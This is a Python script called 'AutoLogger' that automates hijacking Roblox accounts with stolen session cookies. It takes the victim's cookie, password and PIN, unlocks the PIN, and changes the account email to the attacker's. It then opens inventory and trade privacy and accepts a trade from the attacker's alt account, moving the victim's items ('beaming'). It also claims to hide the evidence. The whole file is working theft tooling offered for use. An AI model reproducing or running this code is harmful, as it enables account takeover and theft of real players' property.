from os import system
from tkinter import E
from turtle import color
import requests
import colorama
import time
import json
import pwinput
from colorama import Fore, Back, Style
from colorama import init
import pystyle 
from pystyle import Colors, Colorate, Box, Write, Center
import requests
from requests.structures import CaseInsensitiveDict
init(autoreset=True)
#update
#main
banner = '''
    _       _       _                        
   /_\ _  _| |_ ___| |___  __ _ __ _ ___ _ _ 
  / _ \ || |  _/ _ \ / _ \/ _` / _` / -_) '_|
 /_/ \_\_,_|\__\___/_\___/\__, \__, \___|_|  
                          |___/|___/         
'''
print(Center.XCenter("AutoLogger by cow#3479"))
Write.Print(banner, Colors.blue_to_cyan, interval=0.000025)
print("")
print("")#made by cow#3479
altc = Write.Input("Enter your alt cookie -> ", Colors.blue_to_cyan, interval=0.0025)
url = "https://www.roblox.com/mobileapi/userinfo"#fetch user information with api1
headers = CaseInsensitiveDict()
headers["Cookie"] = ".ROBLOSECURITY=" + altc
resp = requests.get(url, headers=headers)#send curl request
api1 = open("user.json", "w") 
api1.write(resp.text)#made by cow#3479
api1.close() #made by cow#3479
file_path = 'user.json'#made by cow#3479
with open(file_path) as file:
    x1 = file.read()#prase json file
x =  x1
y = json.loads(x)#made by cow#3479
user1 = y["UserName"]#fetch user#made by cow#3479
robux1 = y["RobuxBalance"]#fetch robux#made by cow#3479
perm1 = y["IsPremium"]#fetch premium info#made by cow#3479
userid = y["UserID"]#fetch premium info#made by cow#3479
Write.Print(f"Nice to meet you,{user1}!", Colors.blue_to_cyan, interval=0.0025)
print("")#made by cow#3479
Write.Print(f"Logged In to {user1}", Colors.green_to_white, interval=0.0025)
print("")
print("")
print("")
print(Box.DoubleCube(f"Account Info Before Log:\n"+f"Robux:{robux1}\n"+f"Premium:{perm1}\n"))
print("")#made by cow#3479
print("")#made by cow#3479
rgmail = pwinput.pwinput(prompt="Enter your replacement gmail address -> ",mask='')#made by cow#3479
print("")#made by cow#3479
tcookie = pwinput.pwinput(prompt="Enter your target cookie -> ",mask='')#made by cow#3479
tpass = pwinput.pwinput(prompt="Enter your target password -> ",mask='')#made by cow#3479
tpin = pwinput.pwinput(prompt="Enter your target pin -> ",mask='')#made by cow#3479
print("")#made by cow#3479
print("")#made by cow#3479
print("")#made by cow#3479
try:#made by cow#3479
    url = 'https://auth.roblox.com/v1/account/pin/unlock'
    token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":tcookie})#get token
    xcrsf = (token.headers['x-csrf-token'])#made by cow#3479
    header = {'X-CSRF-TOKEN': xcrsf}#made by cow#3479
    payload = {'pin': tpin}#made by cow#3479
    r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":tcookie})#unlock pin using headers#made by cow#3479
    print("")#made by cow#3479
    Write.Print("Unlocked PIN\n", Colors.green_to_white, interval=0.0025)#made by cow#3479
except:#made by cow#3479
  Write.Print("Could not unlock PIN\n", Colors.red_to_white, interval=0.0025),input("")#if pin does not work
with requests.session() as session:#made by cow#3479
            session.cookies['.ROBLOSECURITY'] = tcookie#fetch cookie#made by cow#3479
            session.headers['x-csrf-token'] = xcrsf#fetch new token#made by cow#3479
            s = session.post('https://accountsettings.roblox.com/v1/email', data={'password':tpass, 'emailAddress':rgmail, 'skipVerificationEmail':False})#Change Email Address
with requests.session() as session:#made by cow#3479
            session.cookies['.ROBLOSECURITY'] = tcookie#fetch cookie
            session.headers['x-csrf-token'] = xcrsf#fetch new token#made by cow#3479
            s = session.post('https://accountsettings.roblox.com/v1/email/verify\n')#Send Email Verify 
print("")
Write.Print("Changed Email Address Please Confirm  New Email Address [You Have 20 seconds to Verify]\n", Colors.green_to_white, interval=0.0025)#made by cow#3479
def countdown(t): #made by cow#3479
    while t:
        mins, secs = divmod(t, 60)#made by cow#3479
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r")#made by cow#3479
        time.sleep(1)#made by cow#3479
        t -= 1#made by cow#3479
t = 20# input time in seconds
countdown(int(t))#run timer#made by cow#3479
with requests.session() as session:#made by cow#3479
            session.cookies['.ROBLOSECURITY'] = tcookie#fetch cookie#made by cow#3479
            session.headers['x-csrf-token'] = xcrsf#fetch new token#made by cow#3479
            s = session.post('https://accountsettings.roblox.com/v1/inventory-privacy', data={'inventoryPrivacy':"AllUsers"})#Change Email Address#made by cow#3479
print("")#made by cow#3479
Write.Print("Updated Users Inventory privacy\n", Colors.green_to_white, interval=0.0025)
with requests.session() as session:#made by cow#3479
            session.cookies['.ROBLOSECURITY'] = tcookie#fetch cookie#made by cow#3479
            session.headers['x-csrf-token'] = xcrsf#fetch new token#made by cow#3479
            s = session.post('https://accountsettings.roblox.com/v1/trade-privacy', data={'tradePrivacy':"All"})#Change Email Address
print("")#made by cow#3479
Write.Print("Updated Users Trade privacy\n", Colors.green_to_white, interval=0.0025)#made by cow#3479
with requests.session() as session:#made by cow#3479
            session.cookies['.ROBLOSECURITY'] = tcookie#fetch cookie
            session.headers['x-csrf-token'] = xcrsf#fetch new token
            s = session.post('https://accountsettings.roblox.com/v1/trade-value', data={'tradeValue':"Low"})#Change Email Address
print("")#made by cow#3479
Write.Print("Updated Users Trade Filter\n", Colors.green_to_white, interval=0.0025)
print("")#made by cow#3479
print("")#made by cow#3479
Write.Print("Waiting Please Send Trade To Target Account\n", Colors.green_to_white, interval=0.0025)
def countdown(t): #made by cow#3479
    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)#made by cow#3479
        print(timer, end="\r")#made by cow#3479
        time.sleep(1)#made by cow#3479rf
        t -= 1#made by cow#3479
t = 30#made by cow#3479
countdown(int(t))#run timer
print("")#made by cow#3479
url = "https://trades.roblox.com/v1/trades/OutBound?sortOrder=Asc&limit=10"#made by cow#3479
headers = CaseInsensitiveDict()#made by cow#3479
headers["Cookie"] = f".ROBLOSECURITY={altc}"
headers["Accept"] = "application/json"
headers["Content-Length"] = "0"#made by cow#3479
resp = requests.get(url, headers=headers)#made by cow#3479
print(resp.text)#made by cow#3479
print("")#made by cow#3479
Write.Print("Find Trade ID above\n", Colors.green_to_white, interval=0.0025)
ttid = Write.Input("Enter The Trade ID -> ", Colors.blue_to_cyan, interval=0.0025)
try:#made by cow#3479
    token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":{tcookie}})#get token
    xcrsf = (token.headers['x-csrf-token'])#made by cow#3479
    url = f"https://trades.roblox.com/v1/trades/{ttid}/accept"
    headers = CaseInsensitiveDict()
    headers["Cookie"] = f".ROBLOSECURITY={tcookie}"#made by cow#3479
    headers["Accept"] = "application/json"#made by cow#3479
    headers["Content-Length"] = "0"#made by cow#3479
    headers["X-CSRF-TOKEN"] = xcrsf#made by cow#3479
    resp = requests.post(url, headers=headers)#made by cow#3479
    Write.Print("Succesfully Accepted Trade\n", Colors.green_to_white, interval=0.0025)
except:#made by cow#3479
    Write.Print("Could not Accept Trade\n", Colors.red_to_white, interval=0.0025)
print("")#made by cow#3479
Write.Print("Hid Beaming Evidence!\n", Colors.green_to_white, interval=0.0025)
print("")#made by cow#3479
Write.Print("Extra Options\n[1]get target info\n", Colors.green_to_white, interval=0.0025)
exta = Write.Input("-> ", Colors.blue_to_cyan, interval=0.0025)
print("")#made by cow#3479
if exta =="1":#made by cow#3479
    url = "https://www.roblox.com/mobileapi/userinfo"#fetch user information with api1
    headers = CaseInsensitiveDict()#made by cow#3479
    headers["Cookie"] = ".ROBLOSECURITY=" + tcookie
    resp = requests.get(url, headers=headers)#send curl request
    api1 = open("target.json", "w") 
    api1.write(resp.text)#made by cow#3479
    api1.close() #made by cow#3479
    file_path = 'user.json'
    with open(file_path) as file:#made by cow#3479
        x1 = file.read()#prase json file
    x =  x1
    y = json.loads(x)
    user1 = y["UserName"]#fetch user
    robux1 = y["RobuxBalance"]#fetch robux
    perm1 = y["IsPremium"]#fetch premium info
    userid = y["UserID"]#fetch premium info
    Write.Print(f"{user1} Account Info:\n"+f"Robux:{robux1}\n"+f"Premium:{perm1}\n",Colors.green_to_white, interval=0.0025)
    print("")
    print("")#made by cow#3479
    Write.Print("Done\n", Colors.green_to_white, interval=0.0025)
input("")#made by cow#3479
